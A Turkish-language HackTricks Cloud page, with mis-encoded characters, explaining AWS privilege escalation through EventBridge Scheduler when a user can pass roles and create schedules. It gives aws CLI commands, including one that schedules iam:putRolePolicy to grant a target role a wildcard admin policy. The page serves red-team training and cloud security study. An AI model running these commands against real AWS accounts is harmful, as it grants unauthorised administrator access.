# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Scheduler, Ã§eÅŸitli AWS hizmetlerine Ã§aÄŸrÄ±lar planlayarak ayrÄ±calÄ±k yÃ¼kseltmek iÃ§in kullanÄ±labilir. PlanlÄ± bir ÅŸekilde hizmetleri Ã§aÄŸÄ±rma yeteneÄŸinden yararlanarak, yeterli izinlere sahip kullanÄ±cÄ±lar ayrÄ±calÄ±klarÄ± yÃ¼kseltebilir. Ä°ÅŸte EventBridge Scheduler'Ä±n ÅŸablon hedefleri kullanarak tetikleyebileceÄŸi bazÄ± temel eylemler:

- Lambda: lambda:InvokeFunction - Lambda fonksiyonlarÄ±nÄ± bir program dahilinde Ã§aÄŸÄ±rÄ±n.
- CodeBuild: codebuild:StartBuild - AWS CodeBuild projelerini baÅŸlatÄ±n.
- CodePipeline: codepipeline:StartPipelineExecution - AWS CodePipeline yÃ¼rÃ¼tmelerini tetikleyin.
- ECS: ecs:RunTask - ECS gÃ¶revlerini Ã§alÄ±ÅŸtÄ±rÄ±n.
- EventBridge: events:PutEvents - EventBridge'e olaylar ekleyin.
- Inspector: inspector:StartAssessmentRun - Amazon Inspector deÄŸerlendirmelerini baÅŸlatÄ±n.
- Kinesis: kinesis:PutRecord - Kinesis akÄ±ÅŸlarÄ±na kayÄ±t ekleyin.
- Firehose: firehose:PutRecord - Firehose teslim akÄ±ÅŸlarÄ±na kayÄ±t ekleyin.
- SageMaker: sagemaker:StartPipelineExecution - SageMaker boru hattÄ± yÃ¼rÃ¼tmelerini baÅŸlatÄ±n.
- SNS: sns:Publish - SNS konularÄ±na mesaj yayÄ±nlayÄ±n.
- SQS: sqs:SendMessage - SQS kuyruklarÄ±na mesaj gÃ¶nderin.
- Step Functions: states:StartExecution - AWS Step Functions yÃ¼rÃ¼tmelerini baÅŸlatÄ±n.

Bunlar, EventBridge Scheduler'Ä±n gerÃ§ekleÅŸtirebileceÄŸi ÅŸablon eylemlerden sadece birkaÃ§Ä±dÄ±r. Ancak, evrensel hedefler kullanarak, AWS hizmetleri arasÄ±nda birÃ§ok baÅŸka eylem de tetiklenebilir. Evrensel hedefler, ÅŸablonlu listenin Ã¶tesinde daha kapsamlÄ± API iÅŸlemlerine olanak tanÄ±r.

EventBridge Scheduler hakkÄ±nda daha fazla bilgi iÃ§in:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `sts:AssumeRole`, `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

`sts:AssumeRole`, `iam:PassRole` ve `scheduler:CreateSchedule veya scheduler:UpdateSchedule` izinlerine sahip kullanÄ±cÄ±lar, daha yÃ¼ksek ayrÄ±calÄ±klara sahip bir rol kullanarak EventBridge Scheduler'Ä± hizmetleri Ã§aÄŸÄ±rmak iÃ§in kullanarak ayrÄ±calÄ±klarÄ± yÃ¼kseltebilir.

Bu izinlerle, bir saldÄ±rgan, yÃ¼kseltilmiÅŸ ayrÄ±calÄ±klara sahip bir rolÃ¼ Ã¼stlenebilir ve bir program oluÅŸtururken veya gÃ¼ncellerken bu rolÃ¼ EventBridge Scheduler'a geÃ§irebilir. Program, daha Ã¶nce listelenen herhangi bir eylemi gerÃ§ekleÅŸtirecek ÅŸekilde yapÄ±landÄ±rÄ±labilir; Ã¶rneÄŸin, Lambda fonksiyonlarÄ±nÄ± Ã§aÄŸÄ±rmak, ECS gÃ¶revlerini baÅŸlatmak, CodePipeline yÃ¼rÃ¼tmelerini tetiklemek veya EventBridge Scheduler tarafÄ±ndan desteklenen 270 AWS hizmetinden herhangi birinin iÅŸlemini gerÃ§ekleÅŸtirmek. Bu eylemleri planlayarak, bir saldÄ±rgan, AWS hizmetleri arasÄ±nda yetkisiz iÅŸlemler gerÃ§ekleÅŸtirmek iÃ§in daha yÃ¼ksek ayrÄ±calÄ±klarÄ± kÃ¶tÃ¼ye kullanabilir.
\\

Ã–rneÄŸin, programÄ± bir ÅŸablon eylemi olan bir Lambda fonksiyonunu Ã§aÄŸÄ±racak ÅŸekilde yapÄ±landÄ±rabilirler:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
EventBridge Scheduler'da ÅŸablonlu hizmet eylemlerine ek olarak, birÃ§ok AWS hizmeti iÃ§in geniÅŸ bir API iÅŸlemleri yelpazesini Ã§aÄŸÄ±rmak Ã¼zere evrensel hedefler kullanabilirsiniz. Evrensel hedefler, neredeyse her API'yi Ã§aÄŸÄ±rma esnekliÄŸi sunar. Bir Ã¶rnek, "putRolePolicy" politikasÄ±na sahip bir rol kullanarak "AdminAccessPolicy" eklemek iÃ§in evrensel hedeflerin kullanÄ±labilir.
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## Referanslar

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
